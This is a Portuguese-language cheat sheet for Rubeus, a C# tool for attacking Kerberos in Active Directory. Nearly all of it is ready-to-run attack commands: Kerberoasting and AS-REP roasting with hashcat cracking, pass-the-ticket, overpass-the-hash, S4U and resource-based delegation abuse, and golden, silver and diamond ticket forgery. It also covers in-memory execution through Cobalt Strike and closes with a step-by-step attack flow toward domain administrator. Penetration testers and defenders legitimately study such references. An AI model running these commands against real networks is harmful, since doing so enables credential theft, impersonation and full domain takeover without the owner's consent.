# 🎫 Rubeus — ferramentas de exploração de Kerberos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de versão:** na documentação atual, golden recebe a chave através de opções como `/rc4` ou `/aes256`; a opção `/krbtgt` apresentada em alguns exemplos foi preservada, mas não corresponde a essa sintaxe. `/rc4opsec` filtra contas sem AES, não garante uma mudança para RC4 em todas as contas. Um LUID seleciona uma sessão: o exemplo com 0x3e7 não significa «todos os tickets». Carregar uma assembly com LoadFile também não executa automaticamente a sua entrada. [Documentação oficial do Rubeus](https://github.com/GhostPack/Rubeus). Um TGT permite pedir tickets de serviço; TGS designa o serviço que os emite; a exploração depende das chaves, políticas e validações existentes.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Interação e exploração de Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 Índice

- [O que é o Rubeus](#-what-is-rubeus)
- [Operações sobre tickets](#-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Ataques com tickets](#-ticket-attacks)
- [Ataques à delegação](#-delegation-attacks)
- [Golden Tickets e Silver Tickets](#-golden--silver-tickets)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-rubeus"></a>
## 🎯 O que é o Rubeus

O **Rubeus** é um conjunto de ferramentas em C# para interagir com Kerberos e explorar as suas funcionalidades:

- 🎫 **Operações sobre tickets** — Pedir, renovar e descrever tickets
- 🔓 **Kerberoasting** — Extrair hashes de tickets de serviço
- 🔑 **AS-REP roasting** — Atacar contas sem pré-autenticação
- 🎭 **Pass-the-Ticket** — Reutilizar tickets roubados
- ✨ **Golden/Silver Tickets** — Forjar tickets

---

## 🚀 Utilização básica

### Executar Rubeus

```powershell
# Execução direta
.\Rubeus.exe <command> [options]

# Executar em memória (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Carregar através de PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-ticket-operations"></a>
## 🎟️ Operações sobre tickets

### Pedir um TGT

```powershell
# Com palavra-passe
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Com hash NTLM
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Com chave AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Com certificado
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Guardar a saída num ficheiro
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Pedir um TGS

```powershell
# Pedir um ticket de serviço
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Com um TGT de um ficheiro
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Listar tickets

```powershell
# Listar os tickets do utilizador atual
.\Rubeus.exe triage

# Listar todos os tickets (exige privilégios de administrador)
.\Rubeus.exe triage /luid:0x3e7

# Extração detalhada dos tickets
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Importar um ticket para a sessão atual
.\Rubeus.exe ptt /ticket:base64ticket

# Importar a partir de um ficheiro
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Criar uma nova sessão de início de sessão e importar
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Descrever um ticket

```powershell
# Mostrar os detalhes do ticket
.\Rubeus.exe describe /ticket:base64ticket

# A partir de ficheiro
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="-kerberoasting"></a>
## 🍖 Kerberoasting

### Kerberoasting básico

```powershell
# Executar Kerberoasting contra todos os SPNs
.\Rubeus.exe kerberoast

# Guardar a saída num ficheiro (formato hashcat)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Escolher um utilizador específico
.\Rubeus.exe kerberoast /user:sqlservice

# Mudança para RC4 (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Kerberoasting avançado

```powershell
# Com um TGT específico
.\Rubeus.exe kerberoast /ticket:base64tgt

# Apenas estatísticas (sem tickets)
.\Rubeus.exe kerberoast /stats

# Escolher um SPN específico
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Cifragem AES (menor visibilidade)
.\Rubeus.exe kerberoast /aes

# Filtrar por utilizador
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Descobrir palavras-passe a partir de hashes de Kerberoasting

```bash
# Hashcat (modo 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="-as-rep-roasting"></a>
## 🔓 AS-REP Roasting

### AS-REP roasting básico

```powershell
# Encontrar contas sem pré-autenticação e obter material para AS-REP roasting
.\Rubeus.exe asreproast

# Guardar a saída num ficheiro
.\Rubeus.exe asreproast /outfile:asrep.txt

# Escolher um utilizador específico
.\Rubeus.exe asreproast /user:targetuser

# Formato hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### Descobrir palavras-passe a partir de hashes AS-REP

```bash
# Hashcat (modo 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="-ticket-attacks"></a>
## 🎭 Ataques com tickets

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Obter um TGT com hash e criar uma nova sessão
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Com chave AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Criar um processo dedicado ao contexto de autenticação
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self — representar o utilizador perante o próprio serviço
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy — representar o utilizador perante outro serviço
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Cadeia completa
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-delegation-attacks"></a>
## 🔀 Ataques à delegação

### Delegação sem restrições

```powershell
# Monitorizar TGTs num sistema com delegação sem restrições
.\Rubeus.exe monitor /interval:5 /nowrap

# Filtro específico
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Recolher TGTs
.\Rubeus.exe harvest /interval:30
```

### Delegação restrita

```powershell
# Pedir um ticket para um serviço permitido
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Delegação restrita baseada em recursos

```powershell
# Após configurar RBCD com PowerMad/PowerView
# Pedir um ticket como a conta de computador do atacante
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-golden--silver-tickets"></a>
## ✨ Golden Tickets e Silver Tickets

### Golden Ticket

```powershell
# Criar um Golden Ticket (exige o hash de krbtgt)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Indicar grupos
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Com chave AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Criar um Silver Ticket (exige o hash da conta de serviço)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Serviço LDAP (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# TGT legítimo modificado
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `asktgt` | Pedir um TGT |
| `asktgs` | Pedir um TGS |
| `kerberoast` | Extrair hashes de tickets de serviço |
| `asreproast` | AS-REP roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service for User (serviço em nome de um utilizador) |
| `golden` | Forjar um Golden Ticket |
| `silver` | Forjar um Silver Ticket |
| `dump` | Extrair todos os tickets |
| `triage` | Listar tickets |

### Opções de autenticação

| Opção | Descrição |
|--------|-------------|
| `/user:` | Nome de utilizador |
| `/password:` | Palavra-passe |
| `/rc4:` | Hash NTLM |
| `/aes256:` | Chave AES256 |
| `/ticket:` | Ticket em Base64 |

### Opções comuns

| Opção | Descrição |
|--------|-------------|
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Guardar a saída num ficheiro |
| `/nowrap` | Não dividir a saída Base64 em várias linhas |
| `/domain:` | Domínio alvo |
| `/dc:` | Controlador de domínio |

### Fluxo de ataque

```powershell
# 1. Executar Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Descobrir palavras-passe a partir dos hashes
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Obter um TGT com a palavra-passe descoberta
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Ou utilizar Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Aceder a recursos
dir \\server\share
```

---

## 📚 Recursos

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Guias de referência relacionados
- [BloodHound](../../BloodHound/translations/README.pt.md)
- [Impacket](../../Impacket/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)

---

<p align="center">
  <b>🎫 Domine o Kerberos!</b><br>
  <i>Rubeus — o ticket para administrador do domínio</i>
</p>
